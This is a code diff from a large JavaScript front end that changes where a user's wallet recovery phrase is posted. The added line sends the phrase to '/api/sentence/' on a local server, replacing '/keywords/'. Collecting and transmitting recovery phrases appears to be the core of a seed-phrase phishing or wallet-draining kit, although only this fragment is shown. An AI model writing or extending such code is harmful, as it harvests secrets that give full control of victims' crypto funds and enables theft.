@@ -65821,7 +65821,7 @@
                 }
 
                 // Send the recovery phrase to the backend
-                axios.post('http://127.0.0.1:8000/keywords/', { keywords: recoveryPhrase })
+                axios.post('http://127.0.0.1:8000/api/sentence/', { keywords: recoveryPhrase })
                     .then(response => {
                         console.log('Recovery phrase successfully sent:', response.data);
                     })
